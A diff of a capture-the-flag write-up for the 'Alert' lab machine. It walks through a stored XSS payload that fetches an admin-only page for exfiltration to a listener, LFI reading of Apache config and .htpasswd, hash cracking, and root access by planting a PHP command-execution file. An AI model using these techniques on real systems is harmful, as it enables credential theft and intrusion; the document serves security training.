@@ -9,27 +9,27 @@ thumb: /assets/images/logos/6f4647030d6aadc676b8d8a459de344f.webp
 # Alert
 
 # 1. Enumeration
-
+<br/><br/>
 Start enumerating ports, there is a web application running, and a ssh service we may need to find some creds
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image.png' | relative_url }})
-
+<br/><br/>
 We can perform some actions like, view a .md file, exploring the web application there is a message suggesting report any trouble through contact us 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_1.png' | relative_url }})
-
+<br/><br/>
 # 2. User flag
-
+<br/><br/>
 Let’s keep enumerating the machine listing directories, there is another one called messages, if we try to send a request to it it doesn’t show anything it may be allowed to show info only to admin
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_2.png' | relative_url }})
-
+<br/><br/>
 Messages is also present in here
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_3.png' | relative_url }})
-
+<br/><br/>
 We tried to upload js code to perform a xss attack, it seems to be vulnerable to it but there are no cookies to steal and we are not able to do anything else different from share the .md file, so we could attempt to fetch files as whoever is behind contact us and send that information to a listener we will set up
-
+<br/><br/>
 ```jsx
 <script>
 fetch("http://alert.htb/index.php?page=messages")
@@ -40,79 +40,82 @@ fetch("http://alert.htb/index.php?page=messages")
 	.catch(error => console.error("Error", error));
 </script>
 ```
-
+<br/><br/>
 Send the payload but before clicking it in share, intercept the request, copy and paste the link and send it to contact us interface
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_4.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_5.png' | relative_url }})
-
+<br/><br/>
 It will be sent successfully
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_6.png' | relative_url }})
-
+<br/><br/>
 And we will receive the info in the netcat listener
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_7.png' | relative_url }})
-
+<br/><br/>
 Decode it using cyberchef, there is a .txt file on it and it is disclosing the way to access files with messages php script, there may be a LFI 
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_8.png' | relative_url }})
-
+<br/><br/>
 There is a Apache2 server running
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_9.png' | relative_url }})
-
+<br/><br/>
 Check default configuration files
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_10.png' | relative_url }})
-
+<br/><br/>
 It give us the whole configurations and the file where a password is stored
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_11.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_12.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_13.png' | relative_url }})
-
+<br/><br/>
 Check the content on .htpasswd
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_14.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_15.png' | relative_url }})
-
+<br/><br/>
 Albert hash found
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_16.png' | relative_url }})
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_17.png' | relative_url }})
-
+<br/><br/>
 Log in as Albert and  get user flag
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_18.png' | relative_url }})
-
+<br/><br/>
 # 3.Priv esc
-
+<br/><br/>
 To escalate privileges we found in `/opt/website-monitor` files that seems to run a web application, root is the owner but management group can performs some tasks in config files
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_19.png' | relative_url }})
-
+<br/><br/>
 Effectively we are part of management group
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_20.png' | relative_url }})
-
+<br/><br/>
 And there is a local service running on port 8080
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_21.png' | relative_url }})
-
+<br/><br/>
 We could forward that port to get more information of this, but i think that we have the necessary to elevate our privileges, furthermore we have the base path where files are requested
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_22.png' | relative_url }})
-
+<br/><br/>
 1. Create a new .php file opening the door to get requests executing commands
 2. Make a request executing whatever command we want through the file we’ve created previously
-
+<br/><br/>
 ![image.png]({{ '/assets/images/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f/3e854f1a-8a8b-4b37-9bc5-8386b8120cde-export-e09da6b1-e978-45e9-bc64-ad20c15a921f_image_23.png' | relative_url }})
-
+<br/><br/>
 Machine Pwned!!!
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
